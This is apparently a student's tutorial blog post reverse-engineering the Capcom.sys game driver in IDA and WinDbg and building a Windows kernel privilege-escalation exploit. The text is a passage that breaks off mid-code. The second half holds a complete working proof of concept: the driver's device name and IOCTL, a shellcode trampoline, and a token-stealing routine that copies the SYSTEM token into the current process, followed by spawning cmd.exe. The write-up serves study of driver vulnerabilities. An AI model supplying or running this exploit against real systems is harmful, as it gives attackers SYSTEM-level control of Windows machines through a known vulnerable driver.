# Capcom.sys : The driver that disables SMEP.

- I tried my best to make the poc as simple as possible, it's no more than 40 lines. Could be found [poc.c](https://github.com/00xAuto/Capcom.sys-Full-Documentation/blob/main/poc.c) with the release [poc.exe](https://github.com/00xAuto/Capcom.sys-Full-Documentation/blob/main/poc.exe).
- I am still a student, mistakes are possible.
- This blog was made possible through this video : https://www.youtube.com/watch?v=pJZjWXxUEl4&t=6844s for OJ Reeves. Consider taking a look over there. Fuzz Security also has a great article about it providing 1 more video as a part 2 of the original video. I will try my best here to include everything to make understanding it easier and less time consuming, because OJ Reeve's video was 2 hours (which again, i recommend watching).

----

## Before we start

A quick background story about this driver. It was first introduced in 2016 when Street Figter 5 was released, and part of the download was this driver, Capcom.sys. This driver disabled SMEP through it's IOCTL (Input/Output Control) codes, Which is the method to communicate with the driver. SMEP is Supervisor Execution prevention, and try to disable may cause some pain, since the to disable SMEP, you need to filp the bit in the CR4 register (more on that here https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/) Which is in a nutshell, flipping the 20th Bit in the CR4 Register, which is responsible for the flags that enable processor feathers and indicate feature capabilities of the processor. Explaining it in more details is not in the scope of the blog.

Here is what an SMEP BSOD (Blue screen of death) looks like :

<img width="523" height="390" alt="image" src="https://github.com/user-attachments/assets/39d38393-4ff9-41f5-9f64-18daee2d57e0" />




**The tweet that started it all :**


https://x.com/thewack0lian/status/779397840762245124

<img width="730" height="478" alt="image" src="https://github.com/user-attachments/assets/6424266a-faea-46f0-ac16-4975e827eeb7" />

- ### Note the following :

I will be providing a copy of Capcom.sys and the poc in this repo so that you can follow up, and this time, I will explain each windows-api we are going to use in detail before I go through the poc.
In the video referenced above, OJ used BinaryNinja, which is great. But for my case, i will be using IDA. You should not face issues trying to replicate in BinaryNinja.
I will also be analyzing it in Assembly, and i will try my best to explain what the instruction is doing.

---

 ## 0x00. Analyzing the driver in IDA

Loading the Capcom.sys into IDA, we are welcomed with this :

<img width="1914" height="966" alt="image" src="https://github.com/user-attachments/assets/3475896e-e038-4b34-8eda-68fa75a710e2" />

DriverEntry() is like the `int main (){}` function when we talk about C++/C, It's the starting point in all drivers we are going to reverse in our journey. 
Some functions the are also in every driver are (focusing on ones mostly related to Capcom.sys) :
- IoCreateDevice/IoCreateSymbolicLink which is part of the DriverEntry's setup, they are 2 functions that always work together during initialization. IoCreateDevice creats DEVICE_OBJECT, meaning the it initializes and prepares the driver name for use. Driver names are called from usermode as "\\Device\\DeviceName".  IoCreateSymbolicLink removes the need for calling "Device" in the path to the driver name and makes it look like this "\\\\.\\DeviceName". The "DeviceName" can be found sometimes like this (in our case, we will need to find it manually, more on that later) :

 <img width="1335" height="550" alt="image" src="https://github.com/user-attachments/assets/7408f3e1-9f72-42f6-b649-58472d1101aa" />

Where \\Device\\DeviceName is what we talked about, and it could be called as "\\\\.\\Hacksys....". 

- IRP_MJ_CREATE handler is used when a usermode process calls "CreateFile", which is a Windows API function used to create or open a File for I/O Device, Which is in our case a windows driver (Capcom.sys). 

https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea

<img width="881" height="306" alt="image" src="https://github.com/user-attachments/assets/46eb8cc5-6481-4efb-8aaa-9eb494885bbb" />
  
  - lpFileName : is the symbolic link "\\\\.\\DeviceName"
  - dwDesiredAccess : The requested access to the file or device, This is what is usually used (even in this case) : GENERIC_READ | GENERIC_WRITE
  - dwShareMode : The sharing mode of the created HANDLE of the driver between other processes, Usually we don't want anything to interfere with our process, so we set it to zero : 0x00
  - lpSecurityAttributes : If this parameter is NULL, the handle returned by CreateFile cannot be inherited by any child processes the application may create and the file or device associated with the returned handle gets a default security descriptor. Which is what we want
  - dwCreationDisposition : An action to take on a file or device that exists or does not exist. The Driver in our case will exist and will be running, so we will set it to : OPEN_EXISTING
  - dwFlagsAndAttributes : The file or device attributes and flags, **FILE_ATTRIBUTE_NORMAL** being the most common default value for files.
  - hTemplateFile : When opening an existing file, CreateFile ignores this parameter, so we will set it to NULL

Everything mentioned here is from the link provided from MSDN, they explain why this api is used, etc :

<img width="757" height="792" alt="image" src="https://github.com/user-attachments/assets/65fa6111-34dc-4214-9dd3-e2ec03154bd6" />

Coming back to our Driver functions :
- IRP_MJ_CLOSE handler which works when the device is closed.
- And the most interesting one for us : IRP_MJ_DEVICE_CONTROL --> This contains the IOCTL code as will be shown later in this blog. In our case, the IOCTL case, the IOCTL code will disable SMEP.
- MmGetSystemRoutineAddress : The name explains itself, It basically asks windows at runtime about the address of a specific function and windows will hand a pointer that can be used to call that function to it.

Incase any of the above was not clear, you can always search up IRP_MJ_DEVICE_CONTROL for instance and u will get a full documentation of it : 

https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control

<img width="775" height="504" alt="image" src="https://github.com/user-attachments/assets/42f91fb3-0d4d-4542-85cb-8ba25071b8e1" />

Now that we have a good idea about what a windows driver contains, let's look more into the driver :

<img width="712" height="624" alt="image" src="https://github.com/user-attachments/assets/97510fe4-4715-4cd1-9c86-c415af14c99f" />

When reversing in IDA, we need to keep in mind the functions/methods in pink, are windows apis, so in that case, IoCreateDevice is a windows API, and we can confirm that by searching for it , which will show us the parameters that this function takes :

https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice

<img width="721" height="251" alt="image" src="https://github.com/user-attachments/assets/fd2aed56-79ba-45c0-8704-3d74a37cd1ac" />

When we compare the functions in this image to the one in the IDA, we see that the driver does have a DeviceName parameter which is passed in the register R8 :

<img width="761" height="383" alt="image" src="https://github.com/user-attachments/assets/2925f796-bc74-4ae1-b95d-83179309e747" />

`lea r9, [rsp]` for instance takes the value of inside rsp to the register r9, **this means that what ever was stored in [rsp+78h+DestinationString] is now in r9 until it's modified.** Which is our target DeviceName for us to be able to call in our POC.

Scrolling down, we see that there is an IoCreateSymbolicLink call, which is creating the "\\\\.\\DeviceName" part, this means that right after that function, the real DeviceName is now officially stored in a register, looking more into it, we see that the register `r8` holds the full name for the driver, this will be important for us to remember when we come back to the DeviceName in windbg :

<img width="612" height="586" alt="image" src="https://github.com/user-attachments/assets/a1c77d45-64d1-422e-9c72-3a88cd248711" />

The offset of the last call of the driver is at 0x707 :

<img width="1112" height="458" alt="image" src="https://github.com/user-attachments/assets/0e3667c7-bbfe-46ba-8c03-816640503ca5" />

Now that we are done with the first part, we see that we have an if condition here :

<img width="864" height="427" alt="image" src="https://github.com/user-attachments/assets/12a23626-bf64-42b0-a8b5-e741097f2616" />

We can also convert to pseudo-code using the button "TAB" :

<img width="699" height="251" alt="image" src="https://github.com/user-attachments/assets/78d7812d-cb90-45e6-bdcf-402b9ef39aef" />

Obviously in our case, we will not close the device handle in our exploit just yet, we will go with the second option, being the funcitons mentioned :

<img width="920" height="425" alt="image" src="https://github.com/user-attachments/assets/74a46fd8-8e52-46ea-881b-07fd23fba253" />


Going into the first function, we see that it's calling IofCompleteRequest :

<img width="421" height="595" alt="image" src="https://github.com/user-attachments/assets/8c2796df-033f-4012-af15-afce103633f0" />

We can renamed that function to that just so we can recognize it. And from MSDN, The IoCompleteRequest macro indicates that the caller has completed all processing for a given I/O request and is returning the given IRP to the I/O manager.

Where IRP is I/O Packet request.

I will look at sub_1047C before the function in the middle, that's the recommened order in my opinion.

<img width="481" height="615" alt="image" src="https://github.com/user-attachments/assets/3e7d31c1-89fe-4f93-93fb-c3bc3b251dc9" />


IoDeleteDevice routine removes a device object from the system, for example, when the underlying device is removed from the system. Meaning that the device cleans up the memory it was using, since the kernel doesn't manage the memory on it's on.

We can rename it and call it DeleteDevice just so we can know that it unloads the driver.

Finally, the best for last, the main function that we will focus on in this blog :

<img width="403" height="236" alt="image" src="https://github.com/user-attachments/assets/fc9b0912-1848-4a1d-900b-21957855c1e2" />

<img width="970" height="678" alt="image" src="https://github.com/user-attachments/assets/6f5f0d27-f22d-4845-b7ed-a082cea295cd" />

This is the function where everything including IOCTL and the vulnerability resides.

Looking at this, we might think that there isn't really much going on, since it's just a bunch of initializations, but after looking around, there is a possibility that the hex values in the image below are the IOCTL codes : 

<img width="683" height="395" alt="image" src="https://github.com/user-attachments/assets/06d7c931-0445-47b2-aa92-5e4b5190b80d" />


To further understand what IOCTL codes are, we need to take a step back and look at the Windows API called DeviceIoControl :

https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol

<img width="690" height="238" alt="image" src="https://github.com/user-attachments/assets/1644b69c-0040-48db-99c2-419b98853ccf" />

Which takes 8 parameters, and I will be explaining them now.

1. hDevice:  this is the variable the holds that we talked about earlier that holds the CreateFileA.
2. dwIoControlCode : is the IOCTL code we were just talking about. it's the code that we will be using to send data to the driver. You can think of it as a phone number to call your friend. The "phone number" is the IOCTL code that you will use to contact the driver and send data/buffer.
3. lpInBuffer : The variable that holds the input buffer (data that will be sent to the driver).
4. nInBufferSize : Size of the buffer, this can be done but sizeof(var).
5. lpOutBuffer : This is supposed to be a variable that will hold the output buffer
6. nOutBufferSize : sizeof of expected output buffer
7. lpBytesReturned : A pointer to a variable that receives the size of the data stored in the output buffer, in bytes. This is usually done by declaring a variable like this : `DWORD var;` and then this same var will be called as a pointer, `&var`.
8. lpOverlapped : If we don't have a FILE_FLAG_OVERLAPPED parameter in our CreateFileA (which was passed a NULL), we will pass in a NULL in DeviceIoControl.

Let's now analyze the path from the IOCTL codes and downwards :

<img width="772" height="667" alt="image" src="https://github.com/user-attachments/assets/1d4bce27-d76e-4749-a10d-c303acee0f9b" />

r11 holds the first IOCTL being 0AA012044h which is hardcoded, and is compared down with edx. If true, we will go to the eax funciton :

<img width="479" height="320" alt="image" src="https://github.com/user-attachments/assets/6efa09b4-ce56-4f02-b681-532b86ece066" />

Then IOCTL 0AA013044h is moved into r10, if the comparsion above fails though, we go to `cmp edx, r10d` and if true, we jump to `mov eax, 8` and `lea esi, [rax-4]` where rax holds 8, and 0x8 - 0x4 is 0x04 so esi holds the decimal (or hex for now) value of 4.

Seeing something like this after IOCTL codes should trigger something, or not, It doesn't really matter. But eax and esi here registers that hold parameter values from the expected DeviceIoControl function. They are possbily the expected size of Input/Output for example.

Now, one important question to ask, Which IOCTL do we use if we want to contact the driver ?

If you studied assembly you would know that 'r'ax indicate a 64 bit value, but as for 'e'ax, it indicates a 32 bit value. Most machines today use x64 bits, which means that we will go with the 'r'ax version of the IOCTL code, and if we track it correctly, we will see that only when the condition for IOCTL 0AA012044h fails, it goes to our 'r'ax instruction : 

<img width="665" height="447" alt="image" src="https://github.com/user-attachments/assets/ef4602e8-3e41-4191-b5e2-10d5c7c9b873" />


Scrolling further down, we see that there are more checks and conditions : 

<img width="775" height="585" alt="image" src="https://github.com/user-attachments/assets/0d15270c-3234-45e0-8f53-97d98559716a" />

Before we move on to Windbg, It's always good to look at all the functions since there isn't really alot of functions :

<img width="387" height="179" alt="image" src="https://github.com/user-attachments/assets/deb67260-b58c-4187-9fb2-5f07bcdd6723" />

We didn't take a look at what they really do, let's take a look :

<img width="907" height="468" alt="image" src="https://github.com/user-attachments/assets/ea531ba4-4197-42ff-8ed0-8f63114461d0" />

sub_10788 moves the cr4 register (which has our SMEP bit (20th bit)) into rax, then it stores the current value of rax which is cr4, into the memory address pointed to by the rcx. Then we have an "AND" gate between rax and 0FFFFFFFFFFEFFFFF. 

If we are going to think about what the cr4 register looks like, it will look something like this :

<img width="726" height="223" alt="image" src="https://github.com/user-attachments/assets/40d38fae-78cb-428a-884c-2cac62bcfbef" />

The SMEP bit is the 21st bit in the CR4 register, 1 being enabled, 0 being disabled. Using some logic here from this hex : 0FFFFFFFFFFEFFFFF, i will only take the last 6 Characters just to explain what is actually happening in the driver : EFFFFF. F is hex is 1111 in binary. E in hex is 1110 in binary. What's actually happening is that the first 5 Fs are 20 bits, using AND gate with anything gives the original value, so 1 AND 0 is 0, 1 AND 1 is 1. And then comes the E bit. Since E 1110, so the 1st bit in "E" will be ANDing with the SMEP byte, being 1. 1 and 0 gives 0. Here is a visualized look on what's happening :

```
00000000 00000000 00000000 00000000 00000000 10110101 00001110 11111000 <-- CR4
00000000 11111111 11111111 11111111 11111111 11101111 11111111 11111111 <-- The 0FFFFFFFFFFEFFFFF
                                                |
                                   Here, the 1 is the SMEP bit, and below it we see a 0, from the E "1110"
                                   using the AND gate between 0 and 1 gives 0, hence disabling SMEP.
```

Hopefully this was clear enough to show that this function was about disabling SMEP. Let's name SMEP_Disable.

Looking at the function below it, see that we are moving the value we stored earlier in rcx is now moved into rax. rcx has the original value of the cr4 register, meaning this restores the state of the CR4 register, hence enabling SMEP again :

<img width="791" height="366" alt="image" src="https://github.com/user-attachments/assets/faf8b3f6-da77-405a-91df-f6345a67dcc8" />

I will be naming it SMEP_Enable.

Now when we look at our functions, we can easily tell which is which as shown :

<img width="395" height="167" alt="image" src="https://github.com/user-attachments/assets/9034633b-9f55-4e23-a53b-b2800ea7c362" />


Enough analyzing (for now). Let's start debugging and talking to the driver.

## 0x02. Windbg + Driver Communication

You are expected to have the debugging env.

Let's now note what we gathered from the analysis as a recap before we jump into work : 
- We found that at the IoCreateSymbolicLink, the DeviceName should be finally in rdx in plaintext at 0x707
- IOCTL 0x0AA013044 is what we will be using to talk to the driver
- We need to note the size of the data we input when talking to the driver (in our poc).

Let's now start windbg :

<img width="1038" height="366" alt="image" src="https://github.com/user-attachments/assets/d6a336c7-ac44-4fd8-bea1-c58a0cb5c36d" />


Let's set a breakpoint at the start of Capcom.sys by first pressing "break", then typing : `sxe ld Capcom` and then go again :

<img width="562" height="725" alt="image" src="https://github.com/user-attachments/assets/a11aa385-c2e5-4ce0-9f71-512980404791" />

<img width="1894" height="844" alt="image" src="https://github.com/user-attachments/assets/fe796e4f-c556-4b51-a02e-d7151698f085" />

Now that we are in a breakpoint, let's set a break point at Capcom+0x707 and read the value in r8 :

<img width="693" height="283" alt="image" src="https://github.com/user-attachments/assets/d5249c4d-e0d0-471a-a3ef-d0106c0442b3" />

And we now have the driver name being "Htsysm72FB".

So if we were to call that driver in CreateFileA, we would call it like this : "\\\\.\\Htsysm72FB".

Since now we have the IOCTL code, driver name, an idea about the possibilities of size of buffer, and the conditions, the best thing we could is just jump to the editor now :

<img width="903" height="738" alt="image" src="https://github.com/user-attachments/assets/122fc217-bee3-4a52-b2da-2702b0f7c0a2" />

Don't let this overwhelm you, it exactly what we discusssed. Libraries imported are the libraries we are supposed to use, can found in the title :

<img width="932" height="653" alt="image" src="https://github.com/user-attachments/assets/e9c85ec8-121f-40c4-9ffa-afbc1876d094" />

The if statement

```cpp
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Driver didn't load successfully, Error : %d\n", GetLastError());
	}
	else {
		printf("[+] Driver was loaded.");
	}
```
This checks if the HANDLE is valid or not, if not (the if condition), we will print driver didn't load and print an error (GetLast error shows the error in Decimal).

Incase of error codes, this will be helpful to troubleshoot the issue : https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-

Let's now attempt to run the binary in the victim : 

<img width="302" height="100" alt="image" src="https://github.com/user-attachments/assets/ef70c9cc-913d-4411-8591-a14476498f17" />

Driver was loaded with no issues, now, to see if our data was passed or not, we will need to break anywhere before the IOCTLs start, say 0x590 as show below :

<img width="733" height="515" alt="image" src="https://github.com/user-attachments/assets/95733285-168b-4643-8e07-b67cc21a082b" />

We will now set a break point at Capcom+0x590 in windbg :

<img width="983" height="452" alt="image" src="https://github.com/user-attachments/assets/f10af05a-ad05-4832-869e-e6d9f389dd83" />

and then run the binary :

<img width="1219" height="453" alt="image" src="https://github.com/user-attachments/assets/005ac0b0-ba2d-45e3-a2f2-cb51ea8acd59" />


Looking at our debugger, we will see that the same assembly instructions in the debugger are in IDA :

Debugger : 


<img width="1790" height="767" alt="image" src="https://github.com/user-attachments/assets/a651f9cd-8650-4c5f-8b03-64a5b600ac9a" />

IDA :

<img width="741" height="614" alt="image" src="https://github.com/user-attachments/assets/65dd464d-39e7-4a42-b1c3-24653bfbf342" />


This means we are at the right spot. Let me explain what We need to do now :

- We are trying to check if we our input was taken into the driver or not, and what the register comparisons actually comapare, this will help us eventually develop the poc to escalate privileges.

Since we know from IDA that the IOCTL condition for x64 will succeed, we can look forward and see that rax will hold 8, we need to watch what r9 will hold when we step forward through the instructions.

To step forward : `p` in windbg :

<img width="948" height="649" alt="image" src="https://github.com/user-attachments/assets/f2788501-0818-4f6a-ae67-5ae621cf08eb" />

after steping forward enough :

<img width="1916" height="824" alt="image" src="https://github.com/user-attachments/assets/7df8f3f0-cb34-4b53-8b13-0e65352a8f40" />

R9 holds 10 ? what is 10 ? 

Firstly, that's Hex 0x10, so 0x10 is actually the size 16 we passed, so r9 holds the size of the input buffer.

This also means that to satisfy the condition, u need to make the size = 8

1 more thing to note is that our input buffer is stored in rdi :

<img width="614" height="269" alt="image" src="https://github.com/user-attachments/assets/02eebd01-122a-4ace-accf-07aaf54cfccc" />

The following condition failed, but if we llok at r8, it's zero. 

<img width="1834" height="781" alt="image" src="https://github.com/user-attachments/assets/e9d826d4-e1ca-445a-894f-3a804f13fae8" />

Meaning that maybe we could try to add size to the output buffer.

Let's add a variable that will store the out buffer and make it of size 4 according to the rsi register : RSI: 0000000000000004

<img width="878" height="744" alt="image" src="https://github.com/user-attachments/assets/d3220d4b-46aa-44ea-86a0-346fdbc69e74" />

Now that we added it, let's now run it and see how it looks in windbg :

<img width="1808" height="637" alt="image" src="https://github.com/user-attachments/assets/8d2e652e-864f-4f53-ac5f-67084d445080" />

**_Note that up to this point, we are trying to meet the checks in the binary._**

Jumping to 0x60a, we see that our input buffer of "AABBCCDD" is now stored in rcx :

<img width="1835" height="630" alt="image" src="https://github.com/user-attachments/assets/2524f7d4-1eb3-4239-9bb4-7d62d3f76bba" />

Looking at IDA, we see that the same instruction leads to passing rcx to the function, so called sub_10524.

Going into that function leads to the buffer of "AABBCCDD" 0x4444434342424141 being passed into rsp :

<img width="863" height="405" alt="image" src="https://github.com/user-attachments/assets/7881f5a3-ac1e-4dfe-8434-5ba1f62a7859" />

mov [rsp], rcx means we are copying 0x4444434342424141 to the address of rsp, meaning that rsp will point to 0x4444434342424141 which is an invalid address, leading to a crash, let's confirm by running the debugger :

<img width="786" height="265" alt="image" src="https://github.com/user-attachments/assets/8cdd8b30-991b-4ca9-a909-05d58549f541" />


Pressing "Go" or "g" in the command line, We experience the best event throughout windows exploitation journey, a BSOD (Blue Screen Of Death) : 

<img width="957" height="507" alt="image" src="https://github.com/user-attachments/assets/fb47f87b-1de6-4b83-ae1b-cd9ba0f209f9" />

Now, we have the following information :

- r8 is trhe size of output
- r9 is the size of input
- rdi stores our input buffer until it's passed to rcx then rsp
- r10 stores our x64 IOCTL.

With all that in mind, we can construct shellcode that will help us escalate to SYSTEM.

Let's anaylze the function that moves the value in rcx to rsp :

<img width="722" height="381" alt="image" src="https://github.com/user-attachments/assets/e94e61b1-cd0a-4c61-881f-8fb95ac907e7" />

If we look closely, we will nkow know that arg_0 is our input.
Going downwards we see that there is a comparsion happening between rcx and rax - 0x8 (8 bytes before the current state of rax). 
So it's basically saying, make sure that the current function (rcx) is pointing to 8 bytes before the current function of rax. And if it's not the case, the die :

<img width="739" height="261" alt="image" src="https://github.com/user-attachments/assets/2ccda47d-e714-47d6-9671-5fe511590663" />

I am not really sure why this happens. It was really weird that this driver came with the game.

So for our case, we will make our input buffer a pointer to a byte and we will allocate virtual memory using the VirtualAlloc API which we will use to store out shellcode, but first, let's use it :

https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc

<img width="775" height="251" alt="image" src="https://github.com/user-attachments/assets/74c28bdb-1f8c-4a20-81f9-6c5cd3f68990" />

- lpAddresso is the desired Memory address of the allocated memory chunk, which in our case, will be NULL. Meaning the system will automatically allocated it for us.
- SIZE_T is the desired size of the buffer, which i will be storing as sizeof(inBuffer) for instance
- flAllocationType is the type of memory allocation we want use. I will be using MEM_COMMIT | MEM_RESERVE. Where the "MEM_COMMIT" will allocate physical storage in memory or the disk paging file for a specified region of pages, and "MEM_RESERVE" will reserve a range of process Virtual addresses for our chunk.
- flProtect basically asks you whether you want your allocated memory chunk to be READ, WRITE, EXECUTE, 2 of them or all of them, for my case, our shellcode will execute, so we will allocate a PAGE_EXECUTE_READWRITE.

Since our shellcode will be a pointer to byte, which looks like this -> PBYTE :

<img width="948" height="69" alt="image" src="https://github.com/user-attachments/assets/b1d11d9f-9062-4b87-a395-0042a3175d51" />

Where the variable "t" in the sizeof will be our shellcode we are going to create in mintue, for now, let's change sizeof(t) to 24.
Since we know that a function should be pointing 8 bytes backwards, I will point the input buffer 8 bytes forward (If u recall the IDA disassembly, we are putting out selves in a the position of rax). Then, I will be initializing the 8 bytes after rax to our desired value (I will first test it with A's to prove the it works).

Let's take a look on how that will look like :

<img width="1191" height="557" alt="image" src="https://github.com/user-attachments/assets/5f8055d6-b78c-484c-813e-47fb1d061476" />

*(uint64_t) is initalizing pointer, where the uint64_t itself is a 64 bit (or 8 bytes) version of the traditional int.
This can be imported using the `stdint.h` library like this : `#include <stdint.h>`.

Running the in the victim machine with our new breakpoint set to Capcom+0x524, which is where the rcx register is being moved into rsp (at 0x524) :


<img width="1704" height="599" alt="image" src="https://github.com/user-attachments/assets/d14365d8-222c-4ac4-9fac-c4ed74678cfc" />

We officially control the RCX register and will now be pased into the rsp register, we can see that by stepping into the next instruction using 'p' :

<img width="1712" height="628" alt="image" src="https://github.com/user-attachments/assets/91a9283c-e22e-49ef-92b0-befce583a116" />

Let's now try to execute something.

We can test with NOPs or 0xCC (which means a breakpoint) by just changing the (buffer + 8) value to something like 0xCC90CC90CC90CC90 :

<img width="861" height="125" alt="image" src="https://github.com/user-attachments/assets/9578d670-84e4-424f-b41b-a774c9805f37" />

Now that we can see that our data is there, we notice that once we are at +0x537, windows crashes. And this is because the comparsion at Capcom+0x537 is returning false, which if it is false, rax is set to 0, and the program exits with the return value of 1, meaning that it has failed.

It would be great if u realized it, but the reason why the comparsion is failing, is because we are passing the buffer without without telling the program where it actually resides. Although this may sound unclear, in C++/C terms, we need to pass in the buffer as pointer, something that looks like this : `&buffer`.

To do that, we will first need to set our `buffer+8` to a variable that is also a ULONG, then pass that variable as a pointer in the DeviceIoControl API :

<img width="1107" height="271" alt="image" src="https://github.com/user-attachments/assets/a8bf79cc-e9fb-43e8-bdbc-527dd8d4c9db" />

We have passed the cmp instruction :

<img width="1890" height="597" alt="image" src="https://github.com/user-attachments/assets/e5dffe8e-72e8-4c3a-8487-985d3707ccd0" />

We should now keep stepping instructions until we reach the call instruction(s) without any issues, the one being the call to our input (Which according to the image is now in rsp var_20) :

<img width="999" height="546" alt="image" src="https://github.com/user-attachments/assets/dd261b2b-3d0e-4b0c-92f7-3a8a28bc2919" />

The call instruction being `call qword ptr [rsp+28h]` which will call and execute our "shellcode" (since rax now holdsour SMEP_Disable function) :

<img width="1153" height="665" alt="image" src="https://github.com/user-attachments/assets/48679b79-ffe6-4ce4-b38d-eb7dbbf742c7" />

Now that we are at `call qword ptr [rsp+28h]`, we should our shellcode to start executing after pressing `p` in the cli :

<img width="930" height="455" alt="image" src="https://github.com/user-attachments/assets/f0bfe560-dd11-4d6e-8a52-f8b0845bc9cd" />

We have now achieved "Code execution", Because if we now press go, the system will run until the next 0xCC. 

<img width="706" height="674" alt="image" src="https://github.com/user-attachments/assets/8bf467c3-d4fd-4f18-a477-1a3fdb99d27d" />

Now is the best time to start working on the shellcode which will lead to a Local Privilege escalation.

Recall from our POC that we have this line : `*(PULONG_PTR)(buffer) = (ULONG_PTR)(buffer + 8);`

We are allocating 8 bytes, which will point to the start of the shellcode (you might need to scroll a bit up to understand incase you forgot). So the first 8 bytes of our code will be :

```cpp
{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
```
Since it will automatically fill up.

Then, we need to call the second 8 bytes, which will contain the token stealing shellcode. And to call that, we will need to call 8 bytes after the current position, which should look something like this in assembly :

`call $+8`

In shellcode, it will look like this (you can use msf nasm shell to do it too) :

```
{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00     // Will be filled up by the pointer to the start of the shellcode
 0xE8, 0x08, 0x00, 0x00, 0x00                       // calling RIP + 8
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00      // pointer to token stealing function
}
```

Now we are almost done, we only need to jmp to rax, but since RIP/EIP just jumped over those 8 bytes, we can do `pop rax`, which will drop a pointer to our buffer that contains the area of memory we are currently in.

So pop rax is 0x58 in hex. And then to jump to the shellcode, we will jump to the thing that was pointed to by rax by dereferencing it, being jmp [rax]. Which is 0xff 0x20:

```cpp
{
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Will be filled up by the pointer to the start of the shellcode
 0xE8, 0x08, 0x00, 0x00, 0x00                       // calling RIP + 8
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // pointer to token stealing function
0x58,                                               // POP RAX, will drop a pointer into the 8 bytes above
0xFF, 0x20                                          // JMP [RAX], jumping to what rax is pointing to
}
```

Now that we have the shellcode, let's add it to our code : 

<img width="524" height="83" alt="image" src="https://github.com/user-attachments/assets/bb4c68ad-92ec-4d58-abfc-9095728cc332" />


And let's also edit this part : 

```cpp
	*(PULONG_PTR)(buffer) = (ULONG_PTR)(buffer + 8);
	*(PULONG_PTR)(buffer + 8) = 0xCC90CC90CC90CC90;
	ULONG_PTR point = (ULONG_PTR)(buffer + 8);
```

to become buffer + 13, since the next 8 bytes is after calling RIP + 8 :

```cpp
	*(PULONG_PTR)(buffer) = (ULONG_PTR)(buffer + 8);
	*(PULONG_PTR)(buffer + 13) = (ULONG_PTR)"shellcode_PlaceHolder";
	ULONG_PTR point = (ULONG_PTR)(buffer + 13);
```
one more thing since we have now active shellcode, we will need to move this shellcode into the variable that holds "VirtualAlloc" : 

`memcpy(buffer, t, 24);`

Now, that we know that 0xCC90CC90CC90CC90 executes, it's now time to create our token stealing function, which will will take the token from the SYSTEM process and then proceed to transfer it to a variable that will hold it. Here is how it will look like :

```cpp
__declspec(noinline) void steal(void* x) {
    uint64_t me  = *(uint64_t*)(__readgsqword(0x188) + 0x220);
    uint64_t sys = me;
    do { sys = *(uint64_t*)(sys + 0x448) - 0x448; }
    while (*(uint64_t*)(sys + 0x440) != 4);
    *(uint64_t*)(me + 0x4b8) = *(uint64_t*)(sys + 0x4b8);
}
```
This should like simple, but '__readgsqword' and the function initializtion is what might look weird.

`__declspec(noinline)` tells the compiler to not inline this function, and keep is as a real function with a real address.
`__readgsqword(0x188)` asks the CPU, who is this current thread ? And then returns KTHREAD.

Adding the value of this `__readgsqword(0x188)` by 0x220, gives us the _KPROCESS, which is the base of the EPROCESS we are looking for :

<img width="575" height="328" alt="image" src="https://github.com/user-attachments/assets/ae1ba0cb-6c9b-4152-8901-ca8a9b9bd732" />

Which means, the token will reside at 0x4b8 more :

<img width="337" height="63" alt="image" src="https://github.com/user-attachments/assets/8e30f3cd-f99e-4747-a68b-8b04dada8397" />

with that information in mind, we can now look at our final look of our code :

<img width="812" height="737" alt="image" src="https://github.com/user-attachments/assets/cea0867e-def8-4c0a-8238-d5561c6881d6" />

I will paste what it looks like here :

```cpp
#include <Windows.h>
#include <stdint.h>
#include <stdio.h>

#define IOCTL 0xAA013044
HANDLE hDevice;

__declspec(noinline) void steal(void* x) {
    uint64_t me = *(uint64_t*)(__readgsqword(0x188) + 0x220);
    uint64_t sys = me;
    do { sys = *(uint64_t*)(sys + 0x448) - 0x448; } while (*(uint64_t*)(sys + 0x440) != 4);
    *(uint64_t*)(me + 0x4b8) = *(uint64_t*)(sys + 0x4b8);
}

int main() {
    hDevice = CreateFileA("\\\\.\\Htsysm72FB",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Device open failed: %d\n", GetLastError()); return 1;
    }
    printf("[+] Device opened\n");

    BYTE t[] = { 0,0,0,0,0,0,0,0,         //  Capcom jumps here : b+8
                 0xE8,8,0,0,0,             // CALL +8
                 0,0,0,0,0,0,0,0,          // steal() 
                 0x58,0xFF,0x20 };         // POP RAX; JMP [RAX]

    PBYTE buffer = VirtualAlloc(NULL, 24, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!buffer) { printf("[-] VirtualAlloc failed: %d\n", GetLastError()); return 1; }

    memcpy(buffer, t, 24);                              // copy trampoline bytes
    *(uint64_t*)(buffer + 0x00) = (uint64_t)(buffer + 8);// [0x00] b+8
    *(uint64_t*)(buffer + 0x0D) = (uint64_t)steal;     // [0x0D] = 13 - steal()

    printf("[+] Trampoline at  : %p\n", buffer);
    printf("[+] steal() at     : %p\n", steal);

    uint64_t point = (uint64_t)(buffer + 8);
    DWORD out = 0, br = 0;
    BOOL result = DeviceIoControl(hDevice, IOCTL, &point, 8, &out, 4, &br, NULL);
    if (!result) { printf("[-] IOCTL failed: %d\n", GetLastError()); return 1; }
    printf("[+] IOCTL succeeded — token stolen\n");
```

Now, one thing is missing, which is starting a process with admin permissions. 

We can do that using system("cmd.exe");

```cpp
#include <Windows.h>
#include <stdint.h>
#include <stdio.h>

#define IOCTL 0xAA013044
HANDLE hDevice;

__declspec(noinline) void steal(void* x) {
    uint64_t me = *(uint64_t*)(__readgsqword(0x188) + 0x220);
    uint64_t sys = me;
    do { sys = *(uint64_t*)(sys + 0x448) - 0x448; } while (*(uint64_t*)(sys + 0x440) != 4);
    *(uint64_t*)(me + 0x4b8) = *(uint64_t*)(sys + 0x4b8);
}

int main() {
    hDevice = CreateFileA("\\\\.\\Htsysm72FB",
